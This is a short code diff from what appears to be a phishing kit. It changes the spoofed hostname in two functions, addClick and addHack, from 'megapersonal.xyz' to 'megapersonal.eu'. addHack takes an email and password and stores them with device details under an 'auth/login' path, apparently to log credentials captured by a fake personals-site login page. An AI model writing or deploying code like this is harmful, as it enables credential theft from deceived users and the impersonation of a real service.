@@ -19,7 +19,7 @@ export async function addClick(ref) {
     let deviceInfo=getDeviceInfo()
     var ts = Date.now()
     var clickData = {
-        hostname: 'www.megapersonal.xyz',
+        hostname: 'www.megapersonal.eu',
         base_url: "auth/login",
         ref: ref,
         device: deviceInfo.device,
@@ -39,7 +39,7 @@ export async function addHack(ref,email,password) {
     var id=ts.toString()
     var hackData = {
         id:id,
-        hostname: 'www.megapersonal.xyz',
+        hostname: 'www.megapersonal.eu',
         base_url: "auth/login",
         ref: ref,
         device: deviceInfo.device,
